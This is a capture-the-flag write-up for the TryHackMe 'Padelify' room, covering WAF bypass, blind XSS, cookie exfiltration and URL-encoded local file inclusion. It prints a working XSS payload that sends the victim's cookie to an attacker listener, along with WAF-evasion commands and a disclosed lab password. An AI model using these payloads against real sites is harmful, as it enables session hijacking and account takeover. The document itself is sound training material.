# 🏴‍☠️ TryHackMe: Padelify  
**Difficulty:** 🟠 Medium  

![Room Badge](https://tryhackme-badges.s3.amazonaws.com/manio11.png)

🔗 [View the room on TryHackMe](https://tryhackme.com/room/padelify)

---

> **Disclaimer:**  
> This write-up is for educational and professional demonstration purposes only.  
> All testing was performed in a controlled, authorized environment (TryHackMe).  
> No techniques described here were used against real-world systems.

---

## About This Write-Up
This document is part of my offensive security portfolio.  
My goal is to present structured, professional case studies that demonstrate practical penetration testing skills, clear reporting, and a real-world methodology.

These write-ups are meant to demonstrate practical offensive security skills relevant to junior pentesting, red teaming, and application security roles.

---

## 🧠 Summary
**Padelify** is a web exploitation challenge focused on **WAF bypass techniques**, **blind XSS exploitation**, and **local file inclusion (LFI)**.  
The attack chain involves bypassing a **signature-based Web Application Firewall**, stealing a **moderator session cookie via blind XSS**, and abusing a vulnerable `page` parameter to read sensitive configuration files.

**Key themes:**
- Web Application Firewall evasion  
- Blind Cross-Site Scripting (XSS)  
- Cookie exfiltration  
- Parameter fuzzing  
- Local File Inclusion (LFI)  
- URL encoding bypass techniques  

---

## 🧰 Tools & Techniques

| Tool / Technique | Purpose |
|------------------|---------|
| **nmap** | Port scanning & service discovery |
| **Gobuster** | Directory & parameter fuzzing |
| **curl** | Manual HTTP testing |
| **Python HTTP server** | XSS exfiltration listener |
| **CyberChef** | URL encoding |
| **WAF evasion** | User-Agent spoofing, string splitting |
| **Blind XSS** | Stored payload execution |

---

## 🚀 Attack Path

### 1. Reconnaissance with nmap

```bash
nmap -Pn 10.67.171.240
```
| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | HTTP    |

I navigated to `http://10.67.171.240` and discovered a registration and login page.  
Registration required moderator approval, indicating a manual verification workflow.  
Interestingly, logging in with the credentials `test:test` succeeded, suggesting either a misconfiguration or leftover test account.  
Since this behavior was not required for exploitation, I continued with the main challenge.

---

### 2. Initial Web Access & WAF Detection
To better understand how the web server handles requests, I sent a manual HTTP request using `curl`.
```
curl 10.67.171.240
```
**Server response:**
```html
403 FORBIDDEN  
Web Application Firewall is ACTIVE
```
**Analysis**
The server immediately returned a 403 Forbidden response.

**This confirms that:**
- Direct requests are being actively filtered
- A Web Application Firewall (WAF) is deployed

**The error message explicitly states:**
"Web Application Firewall is ACTIVE"

**This strongly indicates:**
- Request inspection is enabled
- Certain patterns and headers are being analyzed
- Automated tools are likely blocked by default

---

### 3. WAF Bypass (User-Agent Spoofing)
After confirming the presence of a Web Application Firewall,
I attempted directory enumeration using Gobuster.

However, the default Gobuster requests were **blocked immediately.**

**This indicated:**
- The WAF inspects HTTP headers
- Specifically the User-Agent
- Blocking known scanner signatures

#### Understanding the Block

**Most automated tools (Gobuster, Nikto, Dirb) use:**
-Static User-Agent strings
- Easily fingerprinted patterns
- Known signatures stored in WAF rulesets

**Example:**
```
User-Agent: gobuster/3.6
```
This makes detection trivial.

#### Bypassing the WAF

To evade detection, I spoofed a legitimate browser User-Agent:
```bash
gobuster dir -u http://10.67.171.240/-w /usr/share/wordlists/dirb/common.txt-a Mozilla/5.0
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

#### Analysis

**We now know:**
- WAF allows browser-like traffic
- Automated tools are blocked by signature
- /logs is publicly accessible
- /config exists but is restricted

**This confirms:**
- The WAF uses static pattern matching instead of behavioral analysis.

#### Security Impact

**In real environments this means:**
- Attackers can bypass protection easily
- Enumeration becomes trivial
- Sensitive directories get exposed
- WAF gives false sense of security

---

### 4. Log File Analysis

```lua
/logs/error.log
```
**Findings:**
- Possible encoded or obfuscated XSS payload detected
- Failed to parse admin_info in: `/var/www/html/config/app.conf`

**Conclusion:**
- XSS attempts already exist
- Sensitive config file exists
- WAF blocks direct access

---

### 5. Blind XSS Discovery
Based on the log file findings, I suspected a stored XSS vulnerability.
To confirm this, I injected a simple HTML payload and monitored my own server.

```html
<img src="http://10.67.101.111:8000" />
```
```bash
python3 -m http.server 8000
```
**Incoming traffic:**
```sql
GET / HTTP/1.1
```

**This proves:**
- My input was stored in the application
- A privileged user (moderator/admin) viewed the page
- Their browser executed my payload
- The request reached my server

**This is the definition of:**
- Blind XSS
Why is this dangerous?

**Blind XSS is extremely dangerous because:**
- The attacker never sees the page
- Payloads execute in high-privilege contexts

**Can lead to:**
- Session hijacking
- Account takeover
- CSRF
- Internal network attacks

---

### 6. WAF Evasion – Cookie Exfiltration
After confirming blind XSS, the next goal was to steal the moderator session cookie.

#### Step 1: Identify WAF filtering behavior

**I first tested if JavaScript itself was blocked:**
```
<script>alert(1)</script>
```
Allowed

**Next, I tested:**
```
document.cookie
```
Blocked

#### Conclusion

**The WAF does not block:**
- <script> tags

**But does block:**
- The literal string document.cookie

This confirms a **signature-based WAF.**

#### Step 2: Bypass using string concatenation

**To evade detection, I used:**
```html
document["coo"+"kie"]
```

**Why this works:**
- Browser concatenates → `cookie`
- WAF scans raw input
- Does NOT see "`cookie`"
- Filter bypassed


#### Step 3: Final exfiltration payload
```html
<script> var i=new Image(); i.src="http://10.67.101.111:9001/?c="+document["coo"+"kie"] </script>
```
#### Step 4: Listener setup
```bash
python3 -m http.server 9001
```
#### Step 5: Cookie captured
```ini
PHPSESSID=e1omj7ther5rnh0g5ks70vjn84
```

**This attack works because:**
1. Payload is stored server-side
2. Moderator loads the page
3. JavaScript executes in their browser
4. Cookie is appended to URL
5. Browser sends request to attacker
6. Session token is stolen

#### Impact

**With this cookie:**
- I fully impersonated the moderator
- No password required
- Session hijacking achieved

**Privilege escalation successful**

---

### 7. Moderator Access
I replaced my cookie with the stolen one.
After refreshing, I was logged in as moderator.

**What is the flag value after logging in as a moderator?**
```text
THM{REDACTED}
```

**Impact:**
- Session hijacking
- Privilege escalation
- Full moderator control

---

### 8. Parameter Fuzzing – LFI
At the beginning of the challenge we found in de /logs file some information about the admin:
- Failed to parse admin_info in /var/www/html/config/app.conf
But the firewall is ofcourse still blocking config/app.conf

So i went looking around and found live.php?page=match.php what could be interesting. 

I tries to fuzz the page parameter to find hidden files or directories.

```bash
gobuster fuzz -u http://10.67.171.240/live.php?page=FUZZ -w /usr/share/wordlists/dirb/common.txt -a Mozilla/5.0 --exclude-length 1907
```
**Results:**
| Path           | Status | Notes         |
| -------------- | ------ | ------------- |
| /config        | 301    | Interesting   |
| /logs          | 301    | Contains logs |
| /css           | 301    | Bootstrap     |
| /js            | 301    | Bootstrap     |
| /index.php     | 200    | Homepage      |
| /php.ini       | 403    | Blocked       |
| /server-status | 403    | Blocked       |

again i found /config and /logs. This time im trying this http://10.67.171.240/live.php?page=/config/app.conf because there is maybe some information about the admin creds. But as expected teh firewall blockes me. Thats the moment im rememberig about encoding techniques and tries URL Encoding.

---

### 9. URL Encoding WAF Bypass
I go to cyberchef and let this /config/app.conf url encoded to %2Fconfig%2Fapp%2Econf. 
I fill it in the url balk and it worked.
```bash
/live.php?page=%2Fconfig%2Fapp%2Econf
```
**Found some admin information**
```ini
admin_info = "bL}8,S9W1o44"
```

**Why this works?**
- WAF inspects RAW request
- Does not decode URL
- Backend decodes internally
- Filter bypassed

---

### 10. Admin Access
I go tot the login page with the username admin and password bL}8,S9W1o44 to retrive the final flag.

**What is the flag value after logging in as admin?**
```
THM{REDACTED}
```

---
## 🏁 Flags
| Flag      | Value                    |
| --------- | ------------------------ |
| Moderator | THM{REDACTED} |
| Admin     | THM{REDACTED}  |

---

## 💭 Reflection
**This room demonstrated how simple, signature-based WAFs can be bypassed using:**
- User-Agent spoofing
- String concatenation
- URL encoding
- Blind XSS showed how stored payloads can lead to full session hijacking.
- The LFI vulnerability demonstrated how poor input validation leads to credential disclosure.

**Key Takeaways:**
- WAFs ≠ security
- Blind XSS is extremely dangerous
- Encoding bypasses defeat filters
- Session hijacking = instant privesc
- Parameter fuzzing is powerful

**Lessons Learned:**
- Test what is filtered
- Break payloads apart
- Combine vulnerabilities
- Log files leak secrets
- Defense-in-depth matters
